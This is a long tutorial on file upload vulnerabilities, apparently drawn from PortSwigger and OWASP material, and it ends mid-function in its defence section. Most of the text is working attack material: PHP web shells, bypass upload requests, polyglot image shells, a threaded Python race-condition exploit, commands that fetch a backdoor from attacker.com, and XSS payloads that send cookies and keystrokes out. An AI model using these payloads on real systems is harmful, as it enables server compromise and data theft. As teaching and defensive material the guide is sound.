# File upload vulnerabilities (comprehensive guide)

Based on PortSwigger Web Security Academy and OWASP Cheat Sheet Series

File upload vulnerabilities occur when web applications allow users to upload files without sufficiently validating their name, type, content, or size. While file upload is essential for modern applications (profile photos, documents, videos), improper implementation transforms this functionality into a critical attack vector. The severity ranges from denial-of-service through disk exhaustion to complete server compromise via web shell deployment and remote code execution.

The core challenge: **any validation weakness—extension filtering, content checking, size limits, or filename sanitization—can enable attackers to upload and potentially execute malicious files**.

> Only test systems you own or are explicitly authorized to assess.

## What are file upload vulnerabilities? (fundamentals)

### The basic attack flow

**Legitimate use case:**
```
1. User uploads profile.jpg (actual image)
2. Server validates: extension, MIME type, content
3. Server stores: /uploads/user123/profile.jpg
4. Server serves: As image with proper headers
5. Result: Harmless image displayed
```

**Attack scenario:**
```
1. Attacker uploads shell.php (malicious script disguised)
2. Server validation: Bypassed or insufficient
3. Server stores: /uploads/shell.php (web-accessible)
4. Attacker requests: https://target.com/uploads/shell.php?cmd=whoami
5. Result: Server executes PHP → Remote Code Execution
```

### Web shells (the primary goal)

**Simple file reader web shell:**
```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

**Usage:**
```
https://target.com/uploads/shell.php

Response: (contents of /etc/passwd, config files, source code)
```

**Command execution web shell:**
```php
<?php echo system($_GET['command']); ?>
```

**Usage:**
```
GET /uploads/shell.php?command=id HTTP/1.1
Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)

GET /uploads/shell.php?command=cat /etc/passwd HTTP/1.1
Response: root:x:0:0:root:/root:/bin/bash...

GET /uploads/shell.php?command=wget http://attacker.com/malware.sh HTTP/1.1
```

**Full-featured web shell (more advanced):**
```php
<?php
// File browser and command executor
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
?>

<html>
<body>
<form method="post">
    <input type="text" name="cmd" placeholder="Enter command" size="80">
    <input type="submit" value="Execute">
</form>
</body>
</html>
```

### Impact severity levels

**Critical - Remote Code Execution:**
- Upload and execute web shell
- Full server control (read/write/execute)
- Database access via local connection
- Pivot to internal network
- Data exfiltration
- Persistent backdoor installation
- Ransomware deployment

**High - System file compromise:**
- Overwrite `.htaccess` or `web.config` (configuration hijacking)
- Replace legitimate scripts (trojanization)
- Overwrite critical system files
- Directory traversal to sensitive locations

**Medium - Client-side attacks:**
- Stored XSS via HTML/SVG upload
- CSRF via uploaded HTML forms
- Phishing via hosted malicious files
- Malware distribution (host becomes CDN for malware)

**Medium - Denial of Service:**
- Disk space exhaustion (fill storage)
- CPU/memory exhaustion (zip bombs, XML bombs)
- Bandwidth exhaustion (large file downloads)

**Low - Information disclosure:**
- Upload file that reveals server paths in error messages
- Source code disclosure via backup files

## Threat landscape (from OWASP)

### Malicious file threats

**1) Parser exploitation:**
- **ImageTrick Exploit**: Malformed images that exploit image processing libraries
- **XXE (XML External Entity)**: Malicious XML in Office docs, SVG
- **ZIP bombs**: Tiny file that decompresses to gigabytes
- **XML bombs (Billion Laughs)**: Exponential entity expansion DOS

**Zip bomb example:**
```
42.zip (42 KB)
  └─ Uncompresses to: 4.5 petabytes
  
Result: Fills entire disk, crashes server
```

**XML bomb example:**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!-- ... continues to lol9 -->
]>
<lolz>&lol9;</lolz>
```

Result: Exponential memory consumption → DOS

**2) File overwrite attacks:**
- Upload file named `index.php` → overwrites legitimate homepage
- Upload `config.php` → overwrites configuration
- Upload `.htpasswd` → overwrites authentication file
- Combined with path traversal: `../../important.php`

**3) Phishing and social engineering:**
- Upload fake job application form (HTML with credential harvesting)
- Upload PDF with embedded malicious links
- Upload document with macros (if subsequently downloaded by admin)

### Public file retrieval threats

**If uploaded files are publicly accessible:**

**1) Information disclosure:**
- Other users' uploads become accessible
- Enumerate sequential filenames: `file1.pdf`, `file2.pdf`, etc.
- Access confidential documents, personal data, trade secrets

**2) Amplification DoS:**
- Small HTTP request → Large file response
- Attacker requests hundreds of large files simultaneously
- Bandwidth/CPU exhaustion

**3) Illegal content hosting:**
- Upload copyrighted material → legal liability
- Upload illegal content → service takedown, criminal charges
- Offensive material → reputation damage

## Unrestricted file upload (no validation)

### Lab: Remote code execution via web shell upload

**Vulnerable code (PHP):**
```php
<?php
// avatar-upload.php
if(isset($_FILES['avatar'])) {
    $file = $_FILES['avatar'];
    $uploadDir = '/var/www/uploads/';
    $filename = $file['name'];  // User-controlled!
    
    // NO VALIDATION AT ALL
    $destination = $uploadDir . $filename;
    move_uploaded_file($file['tmp_name'], $destination);
    
    echo "Avatar uploaded: /uploads/$filename";
}
?>
```

**Exploitation:**

**Step 1: Create PHP web shell**
```php
// shell.php
<?php system($_GET['cmd']); ?>
```

**Step 2: Upload via form**
```html
<form action="/avatar-upload.php" method="post" enctype="multipart/form-data">
    <input type="file" name="avatar">
    <input type="submit" value="Upload">
</form>
```

**Step 3: Access and execute**
```bash
# Verify upload
curl https://target.com/uploads/shell.php
Response: (blank or PHP source if not executed)

# Execute commands
curl "https://target.com/uploads/shell.php?cmd=whoami"
Response: www-data

curl "https://target.com/uploads/shell.php?cmd=cat%20/etc/passwd"
Response: root:x:0:0:root:/root:/bin/bash...

curl "https://target.com/uploads/shell.php?cmd=ls%20-la%20/"
Response: (filesystem listing)
```

**Step 4: Establish persistence**
```bash
# Download more capable shell
curl "https://target.com/uploads/shell.php?cmd=wget%20http://attacker.com/backdoor.php%20-O%20/var/www/backdoor.php"

# Create cron job for persistence
curl "https://target.com/uploads/shell.php?cmd=echo%20'*/5%20*%20*%20*%20*%20/usr/bin/php%20/var/www/backdoor.php'%20|%20crontab%20-"
```

## Bypassing Content-Type validation

### Lab: Web shell upload via Content-Type restriction bypass

**Vulnerable validation:**
```php
<?php
if(isset($_FILES['file'])) {
    $file = $_FILES['file'];
    
    // ONLY checks client-supplied Content-Type header
    $contentType = $file['type'];  // From browser!
    
    $allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
    if(!in_array($contentType, $allowedTypes)) {
        die("Error: Only images allowed!");
    }
    
    // Saves with user-supplied filename
    $destination = '/var/www/uploads/' . $file['name'];
    move_uploaded_file($file['tmp_name'], $destination);
    
    echo "File uploaded successfully!";
}
?>
```

**Understanding multipart/form-data structure:**
```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="profile.jpg"
Content-Type: image/jpeg

[Binary image data]
------WebKitFormBoundary--
```

**Key insight:** `Content-Type: image/jpeg` is **client-controlled** and trivially spoofed.

**Exploitation with Burp Suite:**

**Step 1: Capture legitimate image upload**
```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.jpg"
Content-Type: image/jpeg

ÿØÿà[JPEG binary data]
------WebKitFormBoundary--
```

**Step 2: Intercept in Burp Proxy → Send to Repeater**

**Step 3: Modify request**
```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**Changes made:**
- `filename="shell.php"` ← Malicious extension
- `Content-Type: image/jpeg` ← Kept to fool validation
- Content: PHP code instead of image data

**Step 4: Send request**
```
Response: "File uploaded successfully!"
```

**Step 5: Execute web shell**
```bash
curl "https://target.com/uploads/shell.php?cmd=id"
Response: uid=33(www-data) gid=33(www-data)
```

**Why it works:** Server trusts `Content-Type` header from client, never validates actual file content.

## Bypassing path restrictions via directory traversal

### Lab: Web shell upload via path traversal

**Scenario:** Uploads directory has PHP execution disabled, but parent directory doesn't.

**Server configuration:**
```apache
# /var/www/uploads/.htaccess
php_flag engine off  # Disables PHP execution in /uploads/
```

**Directory structure:**
```
/var/www/
  ├── html/           ← PHP executes here
  │   ├── index.php
  │   └── login.php
  ├── uploads/        ← PHP does NOT execute here
  │   └── .htaccess   (php_flag engine off)
  └── scripts/        ← PHP executes here
```

**Vulnerable upload code:**
```php
<?php
$filename = $_FILES['file']['name'];
$destination = '/var/www/uploads/' . $filename;

// Extension check
if(!preg_match('/\.(jpg|png|gif)$/i', $filename)) {
    die("Only images allowed!");
}

move_uploaded_file($_FILES['file']['tmp_name'], $destination);
?>
```

**Exploitation:**

**Step 1: Test basic path traversal**
```http
POST /upload HTTP/1.1

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="../shell.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**Result:**
```
Destination: /var/www/uploads/../shell.jpg
Resolves to: /var/www/shell.jpg
```

**File now in parent directory where PHP executes!**

**Step 2: Access shell**
```bash
curl "https://target.com/shell.jpg?cmd=whoami"
Response: www-data
```

**Alternative traversal payloads:**
```
../shell.jpg           # One level up
../../html/shell.jpg   # Into html directory
../../../tmp/shell.jpg # Multiple levels
```

**Step 3: If simple traversal blocked, use encoding**
```http
filename="..%2fshell.jpg"     # URL encoded
filename="..%252fshell.jpg"   # Double encoded
filename="....//shell.jpg"    # Nested traversal
```

## Bypassing extension blacklists

### Lab: Web shell upload via extension blacklist bypass

**Vulnerable blacklist:**
```php
<?php
$filename = $_FILES['file']['name'];
$extension = pathinfo($filename, PATHINFO_EXTENSION);

// Blacklist approach (WEAK)
$blacklist = ['php', 'php3', 'php4', 'php5', 'phtml', 'exe', 'sh'];
if(in_array(strtolower($extension), $blacklist)) {
    die("File type not allowed!");
}

move_uploaded_file($_FILES['file']['tmp_name'], "/var/www/uploads/$filename");
?>
```

### Bypass 1: Alternative executable extensions

**Apache-executable PHP extensions:**
```
.php5    # PHP 5 files
.php7    # PHP 7 files
.phtml   # PHP HTML
.phar    # PHP Archive
.phps    # PHP source (sometimes executes)
.php3    # PHP 3 (if not blacklisted)
.shtml   # Server-side includes
```

**Check Apache configuration:**
```apache
# In apache2.conf or php.conf
<FilesMatch \.ph(p[3-7]?|tml)$>
    SetHandler application/x-httpd-php
</FilesMatch>
```

**Exploitation:**
```http
POST /upload HTTP/1.1

filename="shell.php7"

<?php system($_GET['cmd']); ?>
```

If `.php7` not blacklisted but Apache executes it → RCE!

### Bypass 2: Upload .htaccess configuration file

**Concept:** Upload Apache config file to enable execution of non-standard extensions.

**Step 1: Upload .htaccess**
```http
POST /upload HTTP/1.1

filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .jpg
php_flag engine on
```

**What this does:**
- `AddType application/x-httpd-php .jpg` → Makes .jpg files execute as PHP
- `php_flag engine on` → Enables PHP in directory

**Step 2: Upload PHP code with .jpg extension**
```http
POST /upload HTTP/1.1

filename="shell.jpg"

<?php system($_GET['cmd']); ?>
```

**Step 3: Execute**
```bash
curl "https://target.com/uploads/shell.jpg?cmd=whoami"
Response: www-data  # PHP executed!
```

**Alternative .htaccess directives:**
```apache
# Make ANY extension execute as PHP
AddHandler application/x-httpd-php .anything

# Specific extensions
AddType application/x-httpd-php .png .gif .pdf

# Via regex
<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

### Bypass 3: Upload web.config (IIS/Windows)

**For IIS servers:**

**Step 1: Upload web.config**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers>
            <add name="PHP_via_FastCGI_jpg" 
                 path="*.jpg" 
                 verb="GET,POST" 
                 modules="FastCgiModule" 
                 scriptProcessor="C:\PHP\php-cgi.exe" 
                 resourceType="Unspecified" 
                 requireAccess="Script" />
        </handlers>
    </system.webServer>
</configuration>
```

**Step 2: Upload PHP as .jpg**
```
shell.jpg containing PHP code
```

**Result:** IIS executes `.jpg` files as PHP.

**For ASP/ASPX:**
```xml
<configuration>
    <system.webServer>
        <handlers>
            <add name="ASP_jpg" 
                 path="*.jpg" 
                 verb="*" 
                 type="System.Web.UI.PageHandlerFactory" />
        </handlers>
    </system.webServer>
</configuration>
```

## Obfuscating file extensions (advanced bypasses)

### Lab: Web shell upload via obfuscated file extension

**Obfuscation techniques from PortSwigger + OWASP:**

### Technique 1: Case variation
```
shell.PHP     (if validation is case-sensitive)
shell.PhP
shell.pHp
shell.Php
```

### Technique 2: Double extensions
```
shell.php.jpg   # Some parsers read right-to-left, others left-to-right
shell.jpg.php
shell.php.png
```

**Why it works:**
- Validation checks last extension: `.jpg` → Allowed
- Apache processes first: `.php` → Executed

### Technique 3: Trailing characters
```
shell.php     # Trailing space
shell.php.    # Trailing dot
shell.php..
shell.php...
```

**Different behaviors:**
- **Validation:** May strip trailing chars → sees `shell.php` → blocks
- **Or:** Keeps trailing chars → sees `shell.php.` → allows (not `.php`)
- **Filesystem (Windows):** Automatically strips trailing dots → saves as `shell.php`
- **Result:** Bypass!

### Technique 4: URL encoding
```
shell%2ephp      # %2e = .
shell%252ephp    # %25 = %, so %252e = %2e
shell.ph%70      # %70 = p
shell.p%68p      # %68 = h
```

**If validation doesn't decode but filesystem does:**
```
Validation sees: shell%2ephp (no .php found) → Allows
Filesystem decodes: shell.php → Saves
Result: PHP file saved!
```

### Technique 5: Null byte injection (legacy)
```
shell.php%00.jpg
shell.php\x00.jpg
```

**How it worked (PHP < 5.3.4):**
```php
$filename = $_GET['filename'];  // "shell.php%00.jpg"

// Validation
$ext = substr($filename, strrpos($filename, '.'));  // ".jpg"
if($ext == '.jpg') {
    // Passes!
}

// File operation (C-based function)
fopen($filename, 'w');  // Stops at \x00, opens "shell.php"
```

**Result:** Validation sees `.jpg`, file system saves `.php`

**Modern status:** Mostly patched, but still found in legacy systems.

### Technique 6: Nested extensions
```
shell.p.phphp
```

**If filter removes `.php` once:**
```
shell.p.phphp
       ^^^^ removed
shell.php ← Dangerous extension remains!
```

**Other nested patterns:**
```
shell.php.php.php   # Multiple nesting
exploit.p.ph.phphpp # Complex nesting
```

### Technique 7: Multibyte Unicode characters (from PortSwigger)
```
Sequences that convert to null bytes or dots:
xC0 x2E → x2E (dot)
xC4 xAE → x2E (dot)  
xC0 xAE → x2E (dot)
```

**Usage:**
```
shell.php[xC0 xAE]jpg
```

**After UTF-8 → ASCII conversion:**
```
shell.php.jpg
```

**If subsequent processing:**
- Sees `.jpg` extension
- But filename contains `.php` → May execute

### Technique 8: Semicolon injection (from PortSwigger)
```
shell.asp;.jpg
shell.php;.jpg
```

**Language-dependent parsing:**
- **High-level (PHP/Java):** Sees `.jpg` extension
- **Low-level (C/C++):** Semicolon terminates → sees `.php`

## Bypassing content validation (polyglot files)

### Lab: Remote code execution via polyglot web shell upload

**Scenario:** Server validates that file is actually an image (checks magic bytes, dimensions).

**Vulnerable validation:**
```php
<?php
function validateImage($file) {
    // Check magic bytes
    $handle = fopen($file, 'rb');
    $header = fread($handle, 8);
    fclose($handle);
    
    // JPEG starts with FF D8 FF
    if(substr($header, 0, 3) !== "\xFF\xD8\xFF") {
        return false;
    }
    
    // Check dimensions
    $imageInfo = getimagesize($file);
    if($imageInfo === false) {
        return false;
    }
    
    return true;
}

if(!validateImage($_FILES['file']['tmp_name'])) {
    die("Not a valid image!");
}

move_uploaded_file($_FILES['file']['tmp_name'], "/uploads/" . $_FILES['file']['name']);
?>
```

**The challenge:** File must be:
1. Valid JPEG (passes magic byte check)
2. Valid image dimensions (passes `getimagesize()`)
3. Contains PHP code
4. Saved with `.php` extension

### Creating polyglot files

**Method 1: ExifTool (easiest)**
```bash
# Start with legitimate JPEG
wget http://example.com/image.jpg

# Embed PHP in comment metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php

# Verify it's still valid image
file shell.php
# Output: shell.php: JPEG image data...

# Verify PHP code embedded
strings shell.php | grep "system"
# Output: <?php system($_GET["cmd"]); ?>
```

**Upload `shell.php` → Passes validation (valid JPEG) + Executes PHP**

**Method 2: Manual hex editing**
```bash
# 1. Get valid JPEG
cp image.jpg shell.php

# 2. Open in hex editor (hexedit, ghex, etc.)
hexedit shell.php

# 3. Locate EXIF comment section (search for "comment")
# 4. Insert PHP code:
#    3C 3F 70 68 70 20 73 79 73 74 65 6D 28 24 5F 47 45 54 5B 27 63 6D 64 27 5D 29 3B 20 3F 3E
#    (hex for: <?php system($_GET['cmd']); ?>)

# 5. Save
```

**Method 3: GIF + PHP hybrid**
```php
GIF89a; <?php system($_GET['cmd']); ?>
```

**Save as `shell.php` and upload:**
- `GIF89a` = Valid GIF header
- `;` = Comment marker in GIF format
- Everything after is ignored by image parsers
- PHP interprets and executes the code

**Method 4: PNG + PHP**
```bash
printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system($_GET["cmd"]); ?>' > shell.php
```

**Breakdown:**
- `\x89\x50\x4E\x47\x0D\x0A\x1A\x0A` = PNG signature
- Followed by PHP code
- Valid PNG header + embedded payload

**Accessing polyglot shell:**
```bash
curl "https://target.com/uploads/shell.php?cmd=whoami"

# Response may include:
# [Image binary data...]
# www-data
# [More binary data...]
```

**The PHP output is mixed with image data, but command executes!**

**Cleaner output:**
```php
// Advanced polyglot shell
GIF89a;
<?php 
header('Content-Type: text/plain');
system($_GET['cmd']);
exit;
?>
```

Sets proper header to avoid binary garbage in response.

## Race condition exploitation

### Lab: Web shell upload via race condition

**Vulnerable workflow:**
```php
<?php
// upload.php
$filename = $_FILES['file']['name'];
$temp = $_FILES['file']['tmp_name'];
$destination = "/var/www/uploads/$filename";

// Step 1: Upload immediately
move_uploaded_file($temp, $destination);

// Step 2: Scan for malware (takes time)
sleep(2);  // Simulates antivirus scan
$scanResult = antivirusCheck($destination);

// Step 3: Delete if malicious
if($scanResult === 'malware') {
    unlink($destination);
    die("Malicious file detected!");
}

echo "File uploaded successfully!";
?>
```

**The vulnerability window:**
```
Time 0ms:      File uploaded to /uploads/shell.php
Time 0-2000ms: File EXISTS and ACCESSIBLE ← Attack window
Time 2000ms:   Scan completes
Time 2001ms:   File deleted
```

**Goal:** Execute the shell during the 2-second window before deletion.

### Exploitation technique

**Attack strategy:**
1. Upload shell repeatedly (flooding)
2. Simultaneously attempt to access it
3. Eventually hit the timing window
4. Execute command before deletion

**Python exploitation script:**
```python
import requests
import threading
import time

TARGET = "https://target.com"
UPLOAD_URL = f"{TARGET}/upload.php"
SHELL_URL = f"{TARGET}/uploads/shell.php"

# Simple PHP shell
shell_content = '<?php system($_GET["cmd"]); ?>'

def upload_shell():
    """Continuously upload shell"""
    while True:
        try:
            files = {
                'file': ('shell.php', shell_content, 'image/jpeg')
            }
            requests.post(UPLOAD_URL, files=files, timeout=2)
        except:
            pass

def access_shell():
    """Continuously try to access and execute shell"""
    while True:
        try:
            params = {'cmd': 'whoami'}
            response = requests.get(SHELL_URL, params=params, timeout=1)
            
            if response.status_code == 200:
                print(f"[+] SUCCESS! Response: {response.text}")
                
                if 'www-data' in response.text or 'root' in response.text:
                    print("[+] RCE ACHIEVED!")
                    print(f"[+] Shell accessible at: {SHELL_URL}")
                    return True
        except:
            pass
    
    return False

print("[*] Starting race condition attack...")
print("[*] Uploading shells in 10 threads...")
print("[*] Attempting access in 10 threads...")

# Launch uploaders
for i in range(10):
    t = threading.Thread(target=upload_shell, daemon=True)
    t.start()

# Launch accessors
for i in range(10):
    t = threading.Thread(target=access_shell, daemon=True)
    t.start()

# Wait for success or timeout
time.sleep(30)
print("[*] Attack completed")
```

**Expected output:**
```
[*] Starting race condition attack...
[*] Uploading shells in 10 threads...
[*] Attempting access in 10 threads...
[+] SUCCESS! Response: www-data
[+] RCE ACHIEVED!
[+] Shell accessible at: https://target.com/uploads/shell.php
```

### Improving success rate

**Technique 1: Upload large file to extend window**
```python
# Create large payload
shell_content = '<?php system($_GET["cmd"]); ?>' + ('A' * 10000000)  # 10MB

# Processing takes longer → wider attack window
```

**Technique 2: Persistent shell**
```php
// shell.php - writes another shell immediately upon execution
<?php
// Write persistent shell
file_put_contents('../backup.php', '<?php system($_GET["cmd"]); ?>');

// Execute current command
system($_GET['cmd']);
?>
```

**Even if `shell.php` deleted, `backup.php` persists!**

**Technique 3: Brute force with timing**
```python
import time

# Upload
start = time.time()
upload_shell()
upload_duration = time.time() - start

# Access immediately after upload
time.sleep(upload_duration + 0.01)  # Precise timing
access_shell()
```

## Additional attack vectors (from OWASP)

### Client-side attacks via file upload

**1) Stored XSS via HTML upload**
```html
<!-- xss.html -->
<html>
<body>
<script>
// Steal cookies
fetch('https://attacker.com/steal?cookie=' + document.cookie);

// Keylogger
document.onkeypress = function(e) {
    fetch('https://attacker.com/keys?key=' + e.key);
};

// Redirect to phishing
setTimeout(function() {
    window.location = 'https://attacker.com/phishing-login';
}, 5000);
</script>
</body>
</html>
```

**Upload and share:** `https://target.com/uploads/xss.html`

**Victim visits → JavaScript executes in `target.com` origin → Session hijacking**

**2) Stored XSS via SVG upload**
```xml
<!-- xss.svg -->
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert("XSS");
      // Steal session
      new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie;
   </script>
</svg>
```

**Advantages:**
- SVG is valid image format (passes validation)
- Supports embedded JavaScript
- Rendered inline by browsers

**3) XXE via XML document upload**

**If application processes uploaded Office documents, XML files:**

```xml
<!-- xxe.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
   <data>&xxe;</data>
</root>
```

**Upload `xxe.xml` → Application parses → Returns `/etc/passwd` contents**

**Office document XXE (DOCX, XLSX):**
```bash
# DOCX files are ZIP archives
unzip document.docx
cd word

# Edit document.xml
<!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document>
   <w:body>
      <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
   </w:body>
</w:document>

# Rezip
zip -r weaponized.docx *

# Upload weaponized.docx
```

**When application processes document → XXE triggered → File disclosure**

### PUT method upload (from PortSwigger)

**Some servers support HTTP PUT for file upload:**

**Discovery:**
```http
OPTIONS /uploads/ HTTP/1.1
Host: target.com
```

**Response:**
```http
HTTP/1.1 200 OK
Allow: GET, POST, PUT, DELETE, OPTIONS
```

`PUT` method supported!

**Exploitation:**
```http
PUT /uploads/shell.php HTTP/1.1
Host: target.com
Content-Type: application/x-httpd-php
Content-Length: 34

<?php system($_GET['cmd']); ?>
```

**No multipart form-data needed, direct file creation!**

**Advantages:**
- Bypasses form-based validation
- Direct file path specification
- Often lacks protections

### CSRF on file upload (from OWASP)

**If upload lacks CSRF protection:**

**Attack page hosted by attacker:**
```html
<!-- csrf-upload.html on attacker.com -->
<html>
<body>
<form id="uploadForm" 
      action="https://target.com/upload" 
      method="post" 
      enctype="multipart/form-data">
    <input type="file" name="file" value="shell.php">
</form>

<script>
// Automatically submit when victim visits
document.getElementById('uploadForm').submit();
</script>
</body>
</html>
```

**Attack flow:**
1. Victim logged into `target.com`
2. Attacker tricks victim to visit `attacker.com/csrf-upload.html`
3. Form auto-submits to `target.com/upload`
4. Uses victim's session cookies
5. Malicious file uploaded under victim's account

## Comprehensive prevention strategies

### Defense Layer 1: Extension whitelisting (OWASP + PortSwigger)

**From OWASP - Whitelist approach:**
```php
<?php
// ONLY allow business-critical extensions
$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];

$filename = $_FILES['file']['name'];
$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

if(!in_array($extension, $allowedExtensions)) {
    die("Only images and PDFs allowed");
}

// Continue processing...
?>
```

**Key points:**
- Whitelist, not blacklist
- Convert to lowercase (prevent case bypasses)
- Use `pathinfo()` correctly
- Minimal necessary extensions only

### Defense Layer 2: Filename sanitization (OWASP)

**From OWASP - Comprehensive filename security:**
```php
<?php
function sanitizeFilename($filename) {
    // Remove path components
    $filename = basename($filename);
    
    // Remove special characters
    $filename = preg_replace('/[^a-zA-Z0-9._-]/', '', $filename);
    
    // Remove leading dots (hidden files) and periods (directory traversal)
    $filename = ltrim($filename, '.');
    
    // Remove multiple consecutive periods
    $filename = preg_replace('/\.+/', '.', $filename);
    
    // Length limit
    if(strlen($filename) > 200) {
        $filename = substr($filename, 0, 200);
    }
    
    // Better: Generate random filename
    $extension = pathinfo($filename, PATHINFO_EXTENSION);
    $newFilename = bin2hex(random_bytes(16)) . '.' . $extension;
    
    return $newFilename;
}
?>
```

**OWASP recommendations:**
- Generate random UUID/GUID for filename
- If user filename required: strict character restrictions
- Alphanumeric + hyphen + underscore only
- No leading dots, spaces, hyphens
- Length limit (filesystem dependent)

### Defense Layer 3: Content validation (OWASP + PortSwigger)

**From OWASP - Validate actual content:**
```php
<?php
function validateImageContent($file) {
    // Check MIME type (server-side)
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mimeType = finfo_file($finfo, $file);
    finfo_close($finfo);
    
    $allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];
    if(!in_array($mimeType, $allowedMimes)) {
        return false;
    }
    
    // Validate image integrity
    $imageInfo = getimagesize($file);
    if($imageInfo === false) {
        return false;
    }
    
    // Check dimensions (prevent huge images)
    list($width, $height) = $imageInfo;
    if($width > 5000 || $height > 5000) {
        return false;  // Too large
    }
    
    // Image rewriting (from OWASP)
    // Destroys any embedded malicious content
    $image = imagecreatefromstring(file_get_contents($file));
    if($image === false) {
        return false;
    }
    
    // Rewrite image (removes EXIF, metadata, embedded code)
    $newFile = tempnam(sys_get_temp_dir(), 'img_');
    imagejpeg($image, $newFile, 90);  // Rewrite as clean JPEG
    imagedestroy($image);
    
    // Replace original with cleaned version
    unlink($file);
    rename($newFile, $file);
    
    return true;
}
?>
```

**OWASP image rewriting benefits:**
- Removes all metadata (EXIF, comments)
- Destroys embedded PHP/scripts
- Normalizes image format
- Validates image is actually processable

**For documents (from OWASP):**
```php
// For Office documents: Use Apache POI (Java)
// Validates document structure
// Detects macros, embedded objects
```

### Defense Layer 4: Secure storage (OWASP priority-based)

**From OWASP - Storage location priority:**

**Priority 1: Separate server (highest security)**
```
Application server: app.example.com
File storage server: files.example.com (completely separate)

Benefits:
- No code execution possible on file server
- Segregation of duties
- Isolated compromise
```

**Priority 2: Outside webroot**
```
Web root: /var/www/html/
Uploads:  /var/file_storage/uploads/ (outside webroot)

Access via handler:
```

```php
// download.php
<?php
$fileId = $_GET['id'];

// Authorization check
if(!user_can_access($fileId, $currentUser)) {
    die("Access denied");
}

// Retrieve from outside webroot
$filePath = '/var/file_storage/uploads/' . $fileId;

// Force download (never execute)
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
readfile($filePath);
?>
```

**Benefits:**
- Files not directly accessible via URL
- Mandatory authorization checks
- Force download (Content-Disposition)

**Priority 3: Inside webroot with restrictions**
```apache
# /var/www/uploads/.htaccess

# Disable all script execution
RemoveHandler .php .php3 .php4 .php5 .phtml .shtml

# Set all files as plain text
ForceType application/octet-stream

# Or deny execution
<FilesMatch "\.ph">
    Deny from all
</FilesMatch>

# Set write-only permissions
# Files can be uploaded but not read via web
```

### Defense Layer 5: File size limits (OWASP)

**From OWASP - Prevent DoS:**
```php
<?php
// Maximum file size: 5MB
$maxFileSize = 5 * 1024 * 1024;

if($_FILES['file']['size'] > $maxFileSize) {
    die("File too large (max 5MB)");
}

// Minimum file size: 100 bytes (prevent tiny DoS files)
if($_FILES['file']['size'] < 100) {
    die("File too small");
}

// For ZIP files: Check decompressed size
if($extension == 'zip') {
    $zip = new ZipArchive();
    if($zip->open($tempFile) === TRUE) {
        $totalSize = 0;
        for($i = 0; $i < $zip->numFiles; $i++) {
            $stat = $zip->statIndex($i);
            $totalSize += $stat['size'];
        }
        $zip->close();
        
        // Decompressed size limit: 50MB
        if($totalSize > 50 * 1024 * 1024) {
            die("ZIP content too large");
        }
    }
}
?>
```

### Defense Layer 6: Antivirus and sandboxing (OWASP)

**From OWASP - Malware detection:**
```php
<?php
// Integrate with ClamAV
function scanFile($filePath) {
    $clamav = "/usr/bin/clamscan";
    $output = shell_exec("$clamav --no-summary $filePath");
    
    if(strpos($output, 'FOUND') !== false) {
        return 'malware';
    }
    
    return 'clean';
}

// Or use VirusTotal API
function scanWithVirusTotal($filePath) {
    $apiKey = 'YOUR_API_KEY';
    $url = 'https://www.virustotal.com/vtapi/v2/file/scan';
    
    $post = [
        'apikey' => $apiKey,
        'file' => new CURLFile($filePath)
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    // Check results...
}

// Sandbox execution (from OWASP)
// Run file in isolated environment before allowing
```

### Defense Layer 7: CDR - Content Disarm & Reconstruct (OWASP)

**From OWASP - For documents:**
```php
<?php
// CDR process for PDF, DOCX, etc.
function disarmAndReconstruct($file, $type) {
